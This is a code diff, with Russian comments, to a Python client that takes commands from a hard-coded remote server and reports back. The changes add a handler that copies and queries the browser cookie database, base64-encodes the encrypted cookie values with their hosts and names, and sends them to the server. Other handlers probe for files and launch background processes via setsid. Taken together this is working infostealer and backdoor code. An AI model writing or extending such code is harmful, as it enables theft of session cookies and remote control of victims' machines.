@@ -4,6 +4,10 @@ import os
 import sys
 import time
 import re
+import tempfile
+import shutil
+import sqlite3
+import base64
 
 SERVER_IP = "192.168.100.3"  # Установите IP сервера
 SERVER_PORT = 5000
@@ -88,7 +92,7 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Новая обработка test_file_exists
+                    # Проверка существования файла
                     if cmd.startswith("test_file_exists:"):
                         path = cmd[len("test_file_exists:"):].strip()
                         path = os.path.expanduser(path)
@@ -98,13 +102,9 @@ def main():
                             s.send("NOT_FOUND".encode())
                         continue
 
-                    # Новая обработка sqlite3_query
+                    # Выполнение sqlite3 запроса с encrypted_value базы куков
                     if cmd.startswith("sqlite3_query:"):
                         try:
-                            import tempfile
-                            import shutil
-                            import sqlite3
-
                             payload = cmd[len("sqlite3_query:"):].strip()
                             file_path, sql = payload.split(" ", 1)
                             file_path = os.path.expanduser(file_path)
@@ -124,13 +124,21 @@ def main():
                             if not rows:
                                 s.send("NO_RESULTS".encode())
                             else:
-                                lines = [" | ".join(str(col) for col in row) for row in rows]
+                                lines = []
+                                for row in rows:
+                                    # row ожидается: (host_key, name, encrypted_value)
+                                    host = str(row[0])
+                                    name = str(row[1])
+                                    encrypted_value = row[2]
+                                    # Закодируем encrypted_value (blob) в base64
+                                    encoded_val = base64.b64encode(encrypted_value).decode()
+                                    lines.append(f"{host} | {name} | {encoded_val}")
                                 s.send("\n".join(lines).encode())
                         except Exception as e:
                             s.send(f"ERROR: {e}".encode())
                         continue
 
-                    # Запуск фоновых/nohup команд без логов, через setsid
+                    # Запуск фоновых команд через setsid
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
